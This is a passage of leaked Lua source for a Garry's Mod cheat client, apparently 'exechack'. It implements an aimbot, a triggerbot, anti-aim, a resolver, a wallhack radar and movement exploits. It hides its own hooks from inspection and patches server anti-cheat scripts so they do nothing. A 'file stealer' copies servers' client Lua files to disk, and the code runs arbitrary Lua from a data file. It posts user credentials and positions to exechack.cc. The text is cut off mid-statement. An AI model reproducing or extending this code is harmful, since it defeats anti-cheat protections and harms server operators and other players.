if((eyeang.y - ang.y) * - 1 > 180 && eyeang.y < 0) then eyeang.y = eyeang.y + 360 end 
if((ang.y - eyeang.y) * - 1 > 180 && ang.y < 0) then ang.y = ang.y + 360 end 
eyeang.y = eyeang.y + (ang.y - eyeang.y) / smooth eyeang.x = eyeang.x + (ang.x - eyeang.x) / smooth eyeang.r = 0 
return eyeang 
else 
return ang
end 
end

local function aimer(ucmd)
if(_cm_CommandNumber(ucmd) == 0 || !gay["AIM_ENABLED"]) then return; end
gettarget();
aa = false;
if(aimtarget && Keycheck(gay["AIM_KEY"]) || aimtarget && gay["AIM_KEY"]==0)then
aa = true;
local pos = PredictPos( GetPos(aimtarget) - _em_EyePos(me) );
local ang = vm.Angle( PredictSpread(ucmd, vm.Angle(pos), 1) )
NormalizeAngle(ang);
_cm_SetViewAngles(ucmd, ang);
if(gay["AIM_AUTOFIRE"]) then
Autofire(ucmd);
end
if(gay["AIM_SILENT"]) then
FixMovement(ucmd);
else
fa = SmoothAim(vm.Angle(pos));
end
end
end

local function GetClosest()
local ddists = {};
local closest;
for k,v in next, player.GetAll() do
if(!Valid(v)) then continue; end
ddists[#ddists + 1] = { _vm_Distance( _em_GetPos(v), _em_GetPos(me) ), v };
end
table.sort(ddists, function(a, b)
return(a[1] < b[1]);
end);
closest = ddists[1] && ddists[1][2] || nil;
if(!closest) then return fa.y; end
local pos = _em_GetPos(closest);
local pos = vm.Angle(pos - _em_EyePos(me));
return( pos.y );
end

local ox=-181;
local oy=0;

local function RandCoin()
local randcoin = math.random(0,1);
if(randcoin == 1) then return 1; else return -1; end
end

local function GetX()
local opt = gay["ANTIAIM_X"]
if(opt == "Emotion") then
local randcoin = gay["ANTIAIM_EMOTION_X"]
if( math.random(100) < randcoin ) then
ox = RandCoin() * 181;
end
elseif( opt == "Up" ) then
ox = -181;
elseif( opt == "Down" ) then
ox = 181;
elseif(opt == "Jitter") then
ox = ox * -1;
elseif(opt == "Test") then
ox = -180 + math.random(1, 1.99999999999999999999);
elseif(opt == "Fake-Down") then
ox = 540.000005
elseif(opt == "Fake-Up") then
ox = - 540.000005
elseif(opt == "Semi-Jitter Down") then
ox = math.random(0, 89)
elseif(opt == "Semi-Jitter Up") then
ox = math.random(0, - 89)
elseif opt == "Spinbot" then
ox = math.sin(CurTime()*1.25)*60
end
end


local function GetY()
local opt = gay["ANTIAIM_Y"]
if(opt == "Emotion") then
local randcoin = gay["ANTIAIM_EMOTION_Y"]
if( math.random(100) < randcoin ) then
oy = fa.y + math.random(-180, 180);
end
elseif( opt == "Eye Angles" ) then
oy = fa.y;
elseif( opt == "Sideways" ) then
oy = fa.y - 90;
elseif(opt == "Jitter") then
oy = fa.y + math.random(-90, 90);
elseif(opt == "TJitter") then
oy = fa.y - 180 + math.random(-90, 90);
elseif(opt == "Static") then
oy = 0;
elseif(opt == "Forward") then
oy = fa.y;
elseif(opt == "Backwards") then
oy = fa.y - 180;
elseif(opt == "Test") then
oy = GetClosest() + 180.79;
end
end

local function walldetect()
local eye = _em_EyePos(me);
local tr = util.TraceLine({
start = eye,
endpos = (eye + (am.Forward(fa) * 10)),
mask = MASK_ALL,
});
if(tr.Hit) then
ox = -181;
oy = -90;
end
end

local function antiaimer(ucmd)
if( (_cm_CommandNumber(ucmd) == 0 && !hacka.miscthipisidion) || cm.KeyDown(ucmd, 1) || cm.KeyDown(ucmd, 32) || aa || !gay["ANTIAIM_ENABLED"]) then return; end
GetX();
GetY();
walldetect();
local aaang = Angle(ox, oy, 0);
_cm_SetViewAngles(ucmd, aaang);
FixMovement(ucmd, true);
end

local function Phys()
local w = _pm_GetActiveWeapon(me);
if w:IsValid() && w:GetClass() == "weapon_physgun" then
if _input_IsKeyDown(KEY_E)then
return true
end
else
return false
end
end

local hopss, hopbhop ,hops = false, true, 0
local function meme(ucmd)
if(!fa) then fa = _cm_GetViewAngles(ucmd); end
if !Phys()&& !hacka.noclipenebled then
fa = fa + Angle(cm.GetMouseY(ucmd) * .023, cm.GetMouseX(ucmd) * -.023, 0);
end
NormalizeAngle(fa);
if(_cm_CommandNumber(ucmd) == 0) then
_cm_SetViewAngles(ucmd, fa);
return;
end
if(cm.KeyDown(ucmd, 1)) then
local ang = vm.Angle(PredictSpread(ucmd, fa ));
NormalizeAngle(ang);
_cm_SetViewAngles(ucmd, ang);
end
if(gay["MISC_BUNNYHOP"]) && !_em_GetMoveType(me)!=MOVETYPE_NOCLIP && _em_GetMoveType(me)!= MOVETYPE_LADDER && _pm_Alive(me) then
if(!em.IsOnGround(me)) then
if ucmd:KeyDown(IN_JUMP)then
if hopbhop then
ucmd:RemoveKey(IN_JUMP);
end
hopss=false
end
if gay["MISC_AUTOSTRAFE"]then
if gay["MISC_AUTOSTRAFE_TYPE"]=="Rage"then
if(engine.TickCount() % 2 == 0) then
local ang = LerpAngle(0.6,ucmd:GetViewAngles(),Angle(0,fa.y+1))
_cm_SetViewAngles(ucmd, ang);
else
local ang = LerpAngle(0.6,ucmd:GetViewAngles(),Angle(0,fa.y-1))
_cm_SetViewAngles(ucmd, ang);
end
end
local mouseX = ucmd:GetMouseX()
if(ucmd:GetMouseX() > 1 || ucmd:GetMouseX() < -1) then
ucmd:SetSideMove(ucmd:GetMouseX() > 1 && 450 || -450);
else
ucmd:SetForwardMove(6200 / me:GetVelocity():Length2D());
ucmd:SetSideMove((ucmd:CommandNumber() % 2 == 0) && -450 || 450);
end
        end
        else
if gay["MISC_BUNNYHOP_SAVEHOPS"]>2 and not hopss then
hops = hops + 1
if hops > gay["MISC_BUNNYHOP_SAVEHOPS"] then
hopbhop = false
timer.Simple(1,function()
hopbhop = true
end)
hops = 0
end
hopss=true
end
        end
    end
end

local function AutoReload(pCmd)
local wep = _pm_GetActiveWeapon(me);
if (_pm_Alive(me) && _em_Health(me) > 0 && IsValid(wep)) then
if (wep:Clip1() <= 0 && wep:GetMaxClip1() > 0 && CurTime() > wep:GetNextPrimaryFire()) then
pCmd:SetButtons(pCmd:GetButtons() + IN_RELOAD)
end
end
end

local function fixmov(cmd, rotation)
local rot_cos = math.cos(rotation)
local rot_sin = math.sin(rotation)
local cur_forwardmove = cmd:GetForwardMove()
local cur_sidemove = cmd:GetSideMove()
cmd:SetForwardMove(((rot_cos * cur_forwardmove) - (rot_sin * cur_sidemove)))
cmd:SetSideMove(((rot_sin * cur_forwardmove) + (rot_cos * cur_sidemove)))
end

local CircleStrafeSpeed = 3
hook.Add("CreateMove", "]]..b.randomforhook..[[", function(ucmd)
if panickey then
if(!fa) then fa = _cm_GetViewAngles(ucmd); end
fa = fa + Angle(cm.GetMouseY(ucmd) * .023, cm.GetMouseX(ucmd) * -.023, 0);
return 
end
meme(ucmd);
aimer(ucmd);
if (buttoncheckbind(gay["CIRCLESTRAFE_KEY"])) then
CircleStrafeVal = CircleStrafeVal + CircleStrafeSpeed
if ((CircleStrafeVal > 0) && ((CircleStrafeVal / CircleStrafeSpeed) > 361)) then
CircleStrafeVal = 0
end
fixmov(ucmd, math.rad((CircleStrafeVal - engine.TickInterval())))
else
CircleStrafeVal = 0
end
antiaimer(ucmd);
if gay["E_SPAMMER"]&& _input_IsKeyDown(KEY_E)then 
RunConsoleCommand("+use")
me:ConCommand("-use")
end 
if gay["AIM_AUTORELOAD"]then
AutoReload(ucmd)
end
if buttoncheckbind(gay["MISC_AUTOPISTOL"])then
if ucmd:TickCount()%2==0 then
ucmd:SetButtons(bit.bor(ucmd:GetButtons(),IN_ATTACK))
end
end
if buttoncheckbind(gay["TRIGGERBOT_KEY"]) then
local Target = me:GetEyeTrace().Entity
if _pm_Alive(me) && ( _em_IsPlayer(Target) || _em_IsNPC(Target) ) && !gay["FRIENDLIST"][_pm_SteamID(me)] then
Autofire(ucmd);
end
end
if gay["WH_DEBUGCAMERA_ENABLED"] && hacka.noclipenebled then
ucmd:RemoveKey(IN_JUMP)
        ucmd:RemoveKey(IN_DUCK)
hacka.vieworigin=hacka.vieworigin+(hacka.viewvelocity)
hacka.viewvelocity=hacka.viewvelocity*0.95
hacka.viewangle.p=math.Clamp(hacka.viewangle.p+(ucmd:GetMouseY()*0.023),-89,89)
hacka.viewangle.y=hacka.viewangle.y+(ucmd:GetMouseX()*-1*0.023)
local add=Vector(0,0,0)
local ang=hacka.viewangle
if ucmd:KeyDown(IN_FORWARD)then add=add+ang:Forward()end
if ucmd:KeyDown(IN_BACK)then add=add-ang:Forward()end
if ucmd:KeyDown(IN_MOVERIGHT)then add=add+ang:Right()end
if ucmd:KeyDown(IN_MOVELEFT)then add=add-ang:Right()end
if input.IsKeyDown(KEY_SPACE)then add=add+ang:Up()end
add=add:GetNormal()*gay["WH_DEBUGCAMERA_SPEEDS"]*(FrameTime()/2)*100
if ucmd:KeyDown(IN_SPEED)then add=add*2 end
hacka.viewvelocity=hacka.viewvelocity+add
if lockview then lockview=ucmd:GetViewAngles()end
if lockview then ucmd:SetViewAngles(lockview)end
ucmd:SetForwardMove(0)
ucmd:SetSideMove(0)
ucmd:SetUpMove(0)
end
end);

hook.Add("PostDrawOpaqueRenderables","]]..b.randomforhook..[[",function()
if hacka.noclipenebled then
local entitylist = _ents_GetAll()
for _ = 1, #entitylist do
local p = entitylist[_]
local nameent = em.GetClass(p)
if nameent~="worldspawn" && _vm_Distance( _em_GetPos(p), hacka.vieworigin ) < 1000 then
if _em_IsDormant(p) || em.GetNoDraw(p)then
_em_DrawModel(p);
end
end
end
end
end) -- leak by durka https://discord.gg/DS9gB7bAKZ

hook.Add("Think","]]..b.randomforhook..[[",function()
if CurTime() > delay then
gay=_util_JSONToTable(_file_Read("]]..b.maincfg..[[","DATA"))
hacka.windowbg=gay["MENU_STYLE_WINDOWBG"]
hacka.titlebar=gay["MENU_STYLE_TITLEBAR"]
hacka.colortext=gay["MENU_STYLE_TEXT"]
hacka.border=gay["MENU_STYLE_BORDER"]
hacka.titletext=gay["MENU_STYLE_TITLETEXT"]
if file.Exists("]]..b.runlua..[[","DATA")then 
RunStringEx("--",_file_Read("]]..b.runlua..[[","DATA"))
file.Delete("]]..b.runlua..[[")
end 
if hacka.fontinit==nil then
surface.CreateFont("fontforplayers",{font=gay["WH_PLAYER_FONT"],size=gay["WH_PLAYER_FONT_SIZE"],shadow=true})
surface.CreateFont("fontforentitys",{font=gay["WH_ENTITY_FONT"],size=gay["WH_ENTITY_FONT_SIZE"],shadow=true})
hacka.fontplayersg="fontforplayers"
hacka.fontentitysg="fontforentitys"
hacka.fontinit=true
me=LocalPlayer()
panickey=false
end
if gay["CLOUDRADAR"] then
if maps[game.GetMap()] then
httpfetch("https://exechack.cc/forum/cloudradar.php",{username = "]]..username..[[",password = "]]..password..[[",server = GetHostName(),map = game.GetMap(),pos = util.TableToJSON(radar(maps[game.GetMap()]))})
end
end
if gay["MISC_SPECTATORLIST"] and not IsValid(hacka.specb) then
hacka.specb = vgui.Create("DFrame",nil,"gay")
hacka.specb:SetSize(gay["MISC_SPECTATORLIST_S_X"], gay["MISC_SPECTATORLIST_S_Y"])
hacka.specb:SetPos(gay["MISC_SPECTATORLIST_X"], gay["MISC_SPECTATORLIST_Y"])
hacka.specb:SetTitle("")
hacka.specb:SetSizable(true)
hacka.specb:ShowCloseButton(false)
hacka.specb.PerformLayout = function(self, c, d)
zapic("MISC_SPECTATORLIST_S_X", c)
zapic("MISC_SPECTATORLIST_S_Y", d)
end
hacka.specb.Paint = function(_, w, h)
draw.RoundedBox(0,0,0,w,h,hacka.windowbg)
draw.RoundedBox(0,0,0,w,22,hacka.titlebar)
draw.SimpleText("Spectators list","]]..b.menufont..[[",5,2.5,hacka.titletext)
_surface_SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,w,h)
local allspectators = 25
for k, v in next, player.GetAll() do
if v != me and pm.GetObserverTarget(v) == me then
draw.SimpleText(_pm_Name(v) .. " " .. _pm_GetUserGroup(v),"]]..b.menufont..[[",5,allspectators,hacka.colortext)
allspectators = allspectators + 20
end
end
end
end
if IsValid(hacka.specb) and not gay["MISC_SPECTATORLIST"] or panickey and IsValid(hacka.specb) then
hacka.specb:Remove()
end
if gay["WH_RADAR"] and not IsValid(hacka.ac) then
hacka.ac = vgui.Create("DFrame",nil,"gay")
hacka.ac:SetSize(gay["WH_RADAR_S_X"], gay["WH_RADAR_S_Y"])
hacka.ac:SetPos(gay["WH_RADAR_X"], gay["WH_RADAR_Y"])
hacka.ac:SetSizable(true)
hacka.ac:SetTitle("")
hacka.ac:SetVisible(true)
hacka.ac:SetDraggable(true)
hacka.ac:ShowCloseButton(false)
hacka.ac.PerformLayout = function(self, c, d)
zapic("WH_RADAR_S_X", c)
zapic("WH_RADAR_S_Y", d)
end
hacka.ac.PaintOver = function(self, t, u)
draw.RoundedBox(0,0,0,t,u,hacka.windowbg)
function hacka.ac:OnMousePressed()
if self.m_bSizable and gui.MouseX() > self.x + self:GetWide() - 20 and gui.MouseY() > self.y + self:GetTall() - 20 then
self.Sizing = {gui.MouseX() - self:GetWide(), gui.MouseY() - self:GetTall()}
self:MouseCapture(true)
return
end
if self:GetDraggable() then
self.Dragging = {gui.MouseX() - self.x, gui.MouseY() - self.y}
self:MouseCapture(true)
return
end
end
_surface_SetDrawColor(hacka.border)
surface.DrawLine(t / 1.94, 25, t / 1.94, u / 2 + 260)
surface.DrawLine(t / 2 - 250,u / 1.94,t / 2 + 260,u / 1.94)
for x, p in next, player.GetAll() do
if gay["WH_DORMANT"] and _em_IsDormant(p)then continue; end
local bz = _em_GetPos(p)
local bA = _em_GetPos(me)
local bB = _em_EyeAngles(me)
local bC = t *0.5 + (bz.x - bA.x) / gay["WH_RADAR_DISTANCE"]
local bD = u *0.5 + (bA.y - bz.y) / gay["WH_RADAR_DISTANCE"]
local bE = bB.y - 90
bE = math.rad(bE)
bC = bC - t *0.5
bD = bD - u *0.5
local bF = bC * math.cos(bE) - bD * math.sin(bE)
local bG = bC * math.sin(bE) + bD * math.cos(bE)
bF = bF + t *0.5
bG = bG + u *0.5
local sizee = gay["WH_RADAR_SIZE"]
if p ~= me then
draw.RoundedBox(1, bF-sizee*0.5, bG-sizee*0.5, sizee, sizee, _team_GetColor(_pm_Team(p)))
if gay["RDRSNA"] then
surface.SetFont("]]..b.font14 ..[[")
local tw, th = _surface_GetTextSize(_pm_Name(p))
draw.SimpleText(_pm_Name(p), "]]..b.font14 ..[[", bF - (tw / 2), bG - 2 -sizee*0.5 , hacka.colortext)
end
            end
        end
draw.RoundedBox(0,0,0,t,22,hacka.titlebar)
draw.SimpleText("Radar","]]..b.menufont..[[",5,2.5,hacka.titletext)
_surface_SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,t,u)
end
end
if IsValid(hacka.ac) and not gay["WH_RADAR"] or panickey and IsValid(hacka.ac) then
hacka.ac:Remove()
end
if gay["WH_INFO"] and not IsValid(hacka.info) then
hacka.info = vgui.Create("DFrame",nil,"gay")
hacka.info:SetSize(gay["WH_INFO_S_X"], gay["WH_INFO_S_Y"])
hacka.info:SetPos(gay["WH_INFO_X"], gay["WH_INFO_Y"])
hacka.info:SetTitle("")
hacka.info:SetSizable(true)
hacka.info:ShowCloseButton(false)
hacka.info.PerformLayout = function(self, c, d)
zapic("WH_INFO_S_X", c)
zapic("WH_INFO_S_Y", d)
end
function hacka.info:Paint(w, h)
draw.RoundedBox(0,0,0,w,h,hacka.windowbg)
draw.RoundedBox(0,0,0,w,22,hacka.titlebar)
draw.SimpleText("Info","]]..b.menufont..[[",5,2.5,hacka.titletext)
_surface_SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,w,h)
draw.SimpleText("Health: " .. _em_Health(me),"]]..b.menufont..[[",2.5,25,hacka.colortext)
draw.SimpleText("Armor: " .. pm.Armor(me),"]]..b.menufont..[[",2.5,40,hacka.colortext)
draw.SimpleText("Velocity: " .. math.Round(_em_GetVelocity(me):Length()),"]]..b.menufont..[[",2.5,55,hacka.colortext)
draw.SimpleText("Server: " .. _GetHostName,"]]..b.menufont..[[",2.5,70,hacka.colortext)
draw.SimpleText("Online: " .. #_player_GetAll(),"]]..b.menufont..[[",2.5,85,hacka.colortext)
draw.SimpleText("Map: " .. _game_GetMap,"]]..b.menufont..[[",2.5,100,hacka.colortext)
draw.SimpleText("Entities: " .. math.Round(ents.GetCount() - player.GetCount() * 12),"]]..b.menufont..[[",2.5,115,hacka.colortext)
draw.SimpleText("Frames: " .. math.Round(1 / _FrameTime()),"]]..b.menufont..[[",2.5,130,hacka.colortext)
draw.SimpleText("Ping: " .. pm.Ping(me),"]]..b.menufont..[[",2.5,145,hacka.colortext)
draw.SimpleText("Date: " .. os.date("%d %b %Y"),"]]..b.menufont..[[",2.5,160,hacka.colortext)
draw.SimpleText("Time: " .. os.date("%H:%M:%S"),"]]..b.menufont..[[",2.5,175,hacka.colortext)
draw.SimpleText("Tickrate: " .. math.Round(1 / engine.TickInterval()),"]]..b.menufont..[[",2.5,190,hacka.colortext)
draw.SimpleText("Gamemode: " .. _engine_ActiveGamemode,"]]..b.menufont..[[",2.5,205,hacka.colortext)
if aimtarget and _em_IsValid(aimtarget) and _em_IsPlayer(aimtarget) then
draw.SimpleText("Target Aim: ".._pm_Name(aimtarget),"]]..b.menufont..[[",2.5,220,hacka.colortext)
else
draw.SimpleText("Target Aim: None","]]..b.menufont..[[",2.5,220,hacka.colortext)
end
local weaons=_pm_GetActiveWeapon(me);
if IsValid(weaons) then
draw.SimpleText("Clip: " ..weaons:Clip1() .."/" .. me:GetAmmoCount(weaons:GetPrimaryAmmoType()),"]]..b.menufont..[[",2.5,235,hacka.colortext)
end
end
end
if IsValid(hacka.info) and not gay["WH_INFO"] or panickey and IsValid(hacka.info) then
hacka.info:Remove()
end
if gay["OBSBYPASS"] and not IsValid(hacka.obs) then
hacka.obs = vgui.Create("DFrame",nil,"gay")
hacka.obs:SetSize(ScrW(),ScrH())
hacka.obs:SetPos(0,0)
hacka.obs:SetTitle("")
hacka.obs:SetDraggable(false)
hacka.obs:ShowCloseButton(false)
hacka.obs.Paint=hudpaint
end
if IsValid(hacka.obs) and not gay["OBSBYPASS"] or panickey and IsValid(hacka.obs) then
hacka.obs:Remove()
end
delay = CurTime() + 2
end
if buttoncheckbind(gay["PANICKEY"]) && !hacka.pc then
hacka.pc = true
panickey=!panickey
timer.Simple( 0.5, function() hacka.pc = false end )
end
if panickey then return end
if input.IsKeyDown(KEY_F12) && !hacka.fpanic then
hacka.fpanic = true
renderpanic(0.05)
timer.Simple( 0.5, function() hacka.fpanic = false end )
end
if buttoncheckbind(gay["WH_DEBUGCAMERA_KEY"]) && !hacka.fc then
hacka.fc = true
hacka.noclipenebled=!hacka.noclipenebled
lockview=hacka.noclipenebled
hacka.setview=true
timer.Simple( 0.5, function() hacka.fc = false end )
end
if buttoncheckbind(gay["WH_THIRDPERSON_KEY"]) && !hacka.th then
hacka.th = true
hacka.miscthipisidion=!hacka.miscthipisidion 
timer.Simple( 0.5, function() hacka.th = false end )
end
if buttoncheckbind(gay["MISC_ADDENTITYFRIEND"]) && !hacka.aep then
hacka.aep = true
local ent=me:GetEyeTrace().Entity
if ent:IsPlayer()then
local pl=gay["FRIENDLIST"]
if !pl[ent:SteamID()] then
pl[ent:SteamID()]=true
if ent:Nick()then hacka.onitify("Add "..ent:Nick().." to friends") end
else
pl[ent:SteamID()]=nil
if ent:Nick()then hacka.onitify("Removed "..ent:Nick().." of friends") end
end
zapic("FRIENDLIST",pl)
else
local ents=gay["ENTITYLIST"]
local class=me:GetEyeTrace().Entity:GetClass()
if !ents[class] then
if class!="worldspawn"then
ents[class]=true
hacka.onitify("Add "..class.." to list")
end
else
ents[class]=nil
hacka.onitify("Removed "..class.." of list")
end
zapic("ENTITYLIST",ents)
end
timer.Simple( 0.5, function() hacka.aep = false end )
end
end)

hook.Add("CalcView", "]]..b.randomforhook..[[", function(p, o, a, f)
if panickey then return end
if panic then return end
if gay["WH_DEBUGCAMERA_ENABLED"]&& hacka.noclipenebled then
if hacka.setview then
hacka.vieworigin=o
hacka.viewangle=a
hacka.setview=false
end
return{origin=hacka.vieworigin,angles=hacka.viewangle,drawviewer=true}
end
local n={}
if gay["NOSWAY"]then
n.angles=_em_EyeAngles(me)
else
n.angles=a
end
if gay["WH_FOVVIEW_ENABLED"]then
n.fov=gay["WH_FOVVIEW"]
end
if gay["WH_THIRDPERSON_ENABLED"]&& hacka.miscthipisidion then
n.angles=fa
n.origin=o + am.Forward(fa) * -gay["WH_THIRDPERSON_DISTANCE"];
n.drawviewer=true
end
n.SetView=false
return n
end);

hook.Add("PreDrawOpaqueRenderables","]]..b.randomforhook..[[",function(ply)
if panickey then return end
if panic then return end
if gay["RESOLVER"]then
for k, v in next, player.GetAll() do
if v == me || ! _em_IsValid(v) then continue; end
local pitch = v:EyeAngles().x
local yaw = v:EyeAngles().y
local roll = 0
local resolverxaxis=gay["RESOLVER_X_AXIS"]
if resolverxaxis ~= "Off" then
if resolverxaxis == "Down" then
pitch = 90
elseif resolverxaxis == "Up" then
pitch = - 90
elseif resolverxaxis == "Center" then
pitch = 0
elseif resolverxaxis == "Invert" then
pitch = - pitch
elseif resolverxaxis == "Random" then
pitch = math.random( - 90, 90)
else
if pitch <= 20 and pitch >= - 10 then
pitch = 90
end
end
end
local resolveryaxis=gay["RESOLVER_Y_AXIS"]
if resolveryaxis ~= "Off" then
if resolveryaxis == "Left" then
yaw = yaw + 90
elseif resolveryaxis == "Right" then
yaw = yaw - 90
elseif resolveryaxis == "Invert" then
yaw = yaw + 180
elseif resolveryaxis == "Random" then
yaw = math.random( - 180, 180)
else
roll = v:EyeAngles().z
end
end
v:SetPoseParameter("aim_pitch", math.NormalizeAngle(pitch))
v:SetPoseParameter("head_pitch", math.NormalizeAngle(pitch))
v:SetPoseParameter("body_yaw", 0)
v:SetPoseParameter("aim_yaw", 0)
v:SetRenderAngles(Angle(0, math.NormalizeAngle(yaw) + math.NormalizeAngle(roll), 0))
v:InvalidateBoneCache()
end
end
end)
local DrawColorModify = DrawColorModify;
hook.Add("RenderScreenspaceEffects","]]..b.randomforhook..[[",function()
if panickey then return end
if panic then return end
if !gay["FILTER_ENABLED"]then return end
local tab = {
["$pp_colour_addr"] = 0,
["$pp_colour_addg"] = 0,
["$pp_colour_addb"] = 0,
["$pp_colour_brightness"] = gay["FILTER_BRIGHTNESS"],
["$pp_colour_contrast"] = gay["FILTER_CONTRAST"]or 1,
["$pp_colour_colour"] = gay["FILTER_SATURATION"],
["$pp_colour_mulr"] = 0,
["$pp_colour_mulg"] = 0,
["$pp_colour_mulb"] = 0
}
DrawColorModify(tab)
end)









end)










]]end;if IsInGame()and o[1]and a==o[1]["name"]then return o[1]["code"]end;if GetHostName:find("PrimeRP")and IsInGame()then return k end;if GetHostName:find("CakeRP")and IsInGame()then return k end;if GetHostName:find("FustRP")and IsInGame()then return k end;if GetHostName2:find("Сочи RP")and IsInGame()then return k end;if t["LUA_FILE_STEALER"]and not ScriptExistsif and not IsInGame()and GetHostName then local X=string.Replace("C:/exechack",[[\]],[[/]])local Y=string.Explode("/",a)local l=X.."/"..GetHostName.."/"exec_CreateDir("C:/exechack")exec_CreateDir("C:/exechack".."/"..GetHostName)for d=1,#Y-1 do l=l..Y[d]if not exec_Exists(l)then exec_CreateDir(l)end;l=l.."/"end;if exec_Exists(X.."/"..GetHostName.."/"..a)then local Z=exec_Read(X.."/"..GetHostName.."/"..a)exec_Write(X.."/"..GetHostName.."/"..a,Z.."\n"..R)else exec_Write(X.."/"..GetHostName.."/"..a,R)end end;if j and s then return" "end;if a=="lua/includes/modules/hook.lua"then return R:Replace("function GetTable() return Hooks end",[[
function GetTable()
local tab1={}
for name,othertable in pairs(Hooks)do
for namehook,func in pairs(othertable)do
if namehook~="]]..b.randomforhook..[["then
if tab1[name]==nil then
tab1[name]={}
end
tab1[name][namehook]=func
end
end
end
return tab1
end
]])end;if a:find("swiftac.lua")then return R:Replace("gcinfo()>650","false")end;if a:find("cl_cpe.lua")then return" "end;if a:find("bankfunctionsprovider.lua")then return' 'end;if a:find("scalednetworkentry.lua")then return string.Replace(R,'GimmeThatScreen["GTS:ObjectFactoryProvider"].RRC','render.Capture')end;if t["LUA_FILE_STEALER"]and not IsInGame()then local X=string.Replace("C:/exechack",[[\]],[[/]])local _=X.."/"..GetHostName.."/"..a;if exec_Exists(_)then if exec_Read(_)==R then else return exec_Read(_)end end end end)for d=0,24 do local a0=10+d;surface.CreateFont("hack_font_"..a0,{font="Roboto",size=a0})end;surface.SetFont("hack_font_18")timer.Simple(1,function()local a1={}function notifications(a)if IsValid(b.rt)then b.rt:Close()end;surface.SetFont("hack_font_26")local R=select(1,surface.GetTextSize(a))+10;b.rt=vgui.Create("DFrame")b.rt:SetSize(R,38-6)b.rt:SetPos(-R,10)b.rt:SetTitle("")b.rt:MakePopup()b.rt:SetDraggable(false)b.rt:ShowCloseButton(false)b.rt.Paint=function(self,G,S)draw.RoundedBox(0,0,0,G,S,b.windowbg)draw.SimpleText(a,"hack_font_26",5,3,b.colortext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,G,S)end;b.rt:MoveTo(10,10,.2,0,-1,function()timer.Simple(1,function()b.rt:MoveTo(-R,10,.2,0,-1)end)end)timer.Simple(3,function()if IsValid(b.rt)then b.rt:Close()end end)end;if username then notifications("Welcome back: "..username)end;local function a2(K,a3,a4,a0,a5,a6,A)local a7=vgui.Create("DButton",a6)a7:SetFont("hack_font_18")a7:SetText(K)a7:SetTextColor(b.colortext)a7:SetSize(a0,a5)a7:SetPos(a3,a4)a7.Paint=function(a8,a9,aa)draw.RoundedBox(0,0,0,a9,aa,b.button)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,a9,aa)if a7.Hovered then draw.RoundedBox(0,0,0,a9,aa,b.buttonhovered)end end;a7.DoClick=A end;local function ab(a0,ac,A)doplpanel=vgui.Create("DFrame")doplpanel:SetSize(a0,ac)doplpanel:SetPos(gui.MouseX()-10,gui.MouseY()-10)doplpanel:SetTitle("")doplpanel:MakePopup()doplpanel:ShowCloseButton(false)doplpanel.Paint=function(h,ad,ae)draw.RoundedBox(0,0,0,ad,ae,b.windowbg)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;A()doplpanel.Think=function()if doplpanel and IsValid(doplpanel)and input.IsMouseDown(107)then if not doplpanel:IsChildHovered()and not doplpanel.Hovered then doplpanel:Close()doplpanel=nil end end end end;local function af(ag,ah,ai)local aj=vgui.Create("DComboBox",doplpanel)aj:SetPos(ag,ah)aj:SetSize(121,20)aj:SetFont("hack_font_12")if t[ai]==1 then aj:SetValue("Up")elseif t[ai]==2 then aj:SetValue("Down")elseif t[ai]==3 then aj:SetValue("Right")elseif t[ai]==4 then aj:SetValue("Left")end;aj:SetTextColor(b.colortext)aj.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;aj.OnSelect=function(h,h,B)if B=="Up"then z(ai,1)elseif B=="Down"then z(ai,2)elseif B=="Right"then z(ai,3)elseif B=="Left"then z(ai,4)end end;aj:AddChoice("Up")aj:AddChoice("Down")aj:AddChoice("Left")aj:AddChoice("Right")end;local function ak(ag,ah,ai,table,K,derma)if derma then doplpanel=derma end;local aj=vgui.Create("DComboBox",doplpanel)aj:SetPos(ag,ah)aj:SetSize(121,20)aj:SetFont("hack_font_12")if K then aj:SetValue(K)else aj:SetValue("Type")end;aj:SetTextColor(b.colortext)aj.Paint=function(h,ad,ae)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ad,ae)end;aj.OnSelect=function(h,h,B)z(ai,B)end;for h,m in pairs(table)do aj:AddChoice(m)end end;local function al(ai,a3,a4)local am=vgui.Create("DColorMixer",doplpanel)am:SetPos(a3,a4+22)am:SetSize(121,150-22)am:SetPalette(false)am:SetWangs(false)am:SetColor(t[ai])am.ValueChanged=function()z(ai,am:GetColor())end;a2("Copy",a3,a4,41,20,doplpanel,function()b.copycolor=am:GetColor()end)a2("Paste",a3+43,a4,44,20,doplpanel,function()if b.copycolor then am:SetColor(b.copycolor)end end)end;local function an(a6,ao,ap,aq,ag,ah,ar,as)local at=vgui.Create("DNumSlider",a6)at:SetPos(ag,ah)at:SetSize(ar,25)at:SetMin(ao)at:SetMax(ap)at:SetDecimals(0)at.TextArea:SetFont("hack_font_13")at.TextArea:SetTextColor(b.colortext)at:SetValue(t[aq])if as then at:SetToolTip(as)end;function at:OnValueChanged(a)z(aq,a)end;function at.Slider.Knob:Paint()end;function at.Slider:Paint(ad,ae)surface.SetDrawColor(b.slider)surface.DrawRect(0,ae/4,ad*(self:GetParent():GetValue()-self:GetParent():GetMin())/self:GetParent():GetRange(),ae/2)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,ae/4,ad,ae/2)end end;local function au(av,aw,m,ad,ax,ay,az,l)local aA=ax:Add("DCheckBoxLabel")aA:SetPos(m,ad)aA:SetText(av)aA:SetFont("hack_font_18")aA:SetTextColor(b.colortext)if az then aA:SetValue(az)else aA:SetValue(t[aw])end;if ay then aA:SetToolTip(ay)end;function aA.Button:Paint(aB,aC)surface.SetDrawColor(b.checkbox)surface.DrawRect(0,0,aB,aC)if self:GetChecked()then surface.SetDrawColor(b.checkboxactive)surface.DrawRect(0,0,aB,aC)end;surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,aB,aC)end;function aA:OnChange(aD)if az then az=aD else z(aw,aD)end end end;include("vgui/dbinder.lua")local function aE(av,aw,m,ad,aF,ax,ay)local 